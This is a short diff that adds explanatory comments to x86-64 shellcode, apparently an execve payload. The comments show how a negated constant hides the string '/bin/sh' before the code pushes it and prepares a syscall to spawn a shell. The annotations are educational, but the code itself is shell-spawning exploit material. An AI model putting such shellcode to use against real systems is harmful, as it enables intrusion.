@@ -25,10 +25,10 @@ main:
     ;mov rcx, 0xdeadbeefcafe1dea
     ;mov rdx, 0xdeadbeefcafe1dea
     xor eax, eax
-    mov rbx, 0xFF978CD091969DD1
-    neg rbx
-    push rbx
-    ;mov rdi, rsp
+    mov rbx, 0xFF978CD091969DD1     ; this is a negative representation of the below word
+    neg rbx                         ; 0x68732f6e69622f
+    push rbx                        ; hs/nib/ -> /bin/sh, now it becomes apparent what's going on
+    ;mov rdi, rsp                   ; prepare syscall with the statements below
     push rsp
     pop rdi
     cdq
